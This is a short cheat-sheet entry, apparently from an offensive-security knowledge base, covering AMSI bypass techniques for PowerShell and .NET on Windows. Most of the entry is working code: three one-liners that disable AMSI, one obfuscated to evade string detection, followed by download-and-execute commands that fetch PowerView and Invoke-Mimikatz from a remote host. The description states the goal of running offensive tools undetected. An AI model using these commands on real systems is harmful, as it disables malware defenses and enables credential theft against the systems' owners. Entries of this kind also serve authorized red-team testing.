---
description: |
  AMSI (Antimalware Scan Interface) bypass techniques for PowerShell and .NET — disable AMSI to run offensive tools without detection.
command: |
  # Basic AMSI bypass (PowerShell)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

  # Obfuscated version (evades string detection)
  $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
  $b=$a.GetField('am'+'siInitFailed','NonPublic,Static')
  $b.SetValue($null,$true)

  # Matt Graeber's reflection method
  [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

  # Bypass then run tools
  IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.21/PowerView.ps1')
  IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.21/Invoke-Mimikatz.ps1')

  # For .NET AMSI bypass (C# tools like Rubeus, SharpHound)
  # Patch amsi.dll AmsiScanBuffer to always return clean
  # Use tools like AmsiTrigger to find flagged strings
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Windows
services: []
techniques:
  - Defense_Evasion
references:
  - https://amsi.fail/
  - https://rastamouse.me/memory-patching-amsi-bypass/
---
